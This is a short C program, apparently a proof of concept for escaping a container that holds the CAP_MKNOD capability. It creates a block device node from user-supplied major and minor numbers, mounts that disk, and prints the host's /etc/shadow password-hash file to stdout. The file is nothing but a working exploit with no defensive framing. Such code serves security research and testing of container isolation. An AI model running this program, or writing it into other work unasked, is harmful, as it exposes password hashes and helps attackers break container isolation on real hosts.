/* -*- compile-command: "gcc -Wall -Werror -static cap_mknod.c -o cap_mknod" -*- */
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#define DEV "/disk"
#define MNT "/mnt"

int main(int argc, char **argv)
{
    if (argc != 4)
        return 1;
    int return_code = 0;
    int etc_shadow = 0;

    dev_t dev = makedev(atoi(argv[1]), atoi(argv[2]));
    if (mknod(DEV, S_IFBLK | S_IRUSR, dev))
    {
        fprintf(stderr, "++ mknod failed: %m\n");
        return 1;
    }
    if (mkdir(MNT, S_IRUSR) && (errno != EEXIST))
    {
        fprintf(stderr, "++ mkdir failed: %m\n");
        goto cleanup_error;
    }
    if (mount(DEV, MNT, argv[3], 0, NULL))
    {
        fprintf(stderr, "++ mount failed: %m\n");
        goto cleanup_error;
    }
    if ((etc_shadow = open(MNT "/etc/shadow", O_RDONLY)) == -1)
    {
        fprintf(stderr, "++ opening /etc/shadow failed: %m\n");
        goto cleanup_error;
    }
    fprintf(stderr, "++ reading /etc/shadow:\n");
    char here = 0;
    errno = 0;
    while (read(etc_shadow, &here, 1) > 0)
        write(STDOUT_FILENO, &here, 1);
    if (errno)
    {
        fprintf(stderr, "read loop failed! %m\n");
        goto cleanup_error;
    }
    goto cleanup;
cleanup_error:
    return_code = 1;
cleanup:
    if (etc_shadow)
        close(etc_shadow);
    umount(MNT);
    unlink(DEV);
    rmdir(MNT);
    return return_code;
}
